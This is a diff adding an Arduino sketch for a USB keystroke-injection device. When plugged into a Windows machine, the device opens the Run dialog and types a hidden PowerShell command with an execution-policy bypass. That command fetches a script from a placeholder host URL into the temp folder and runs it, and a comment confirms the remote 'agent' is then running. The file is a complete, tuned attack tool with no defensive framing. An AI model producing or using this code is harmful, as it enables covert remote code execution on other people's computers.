@@ -1,0 +1,42 @@
+#include <Keyboard.h>
+
+#define LEDPIN 11   // adjust to your clone's onboard LED, cosmetic only
+
+// ---- CONFIG ----
+const char* CMD = "powershell -w hidden -ep bypass -c \"iwr HOST_URL -outf $env:TEMP\\a.ps1;& $env:TEMP\\a.ps1\"";
+const unsigned long ENUM_DELAY = 3000;   // bootloader + USB enumeration settle
+const unsigned long RUN_DELAY  = 1200;   // time for Run dialog to appear
+const unsigned long TYPE_DELAY = 12;     // ms per char — raise if chars drop
+// ----------------
+
+void typeSlow(const char* s) {
+  for (const char* p = s; *p; p++) {
+    Keyboard.print(*p);
+    delay(TYPE_DELAY);
+  }
+}
+
+void setup() {
+  pinMode(LEDPIN, OUTPUT);
+  delay(ENUM_DELAY);
+  Keyboard.begin();
+  delay(400);
+
+  digitalWrite(LEDPIN, HIGH);
+
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('r');
+  Keyboard.releaseAll();
+  delay(RUN_DELAY);
+
+  typeSlow(CMD);
+  delay(200);
+  Keyboard.press(KEY_RETURN);
+  Keyboard.releaseAll();
+
+  delay(1500);
+  digitalWrite(LEDPIN, LOW);
+  Keyboard.end();   // board goes quiet, agent is running
+}
+
+void loop() { delay(1000); }
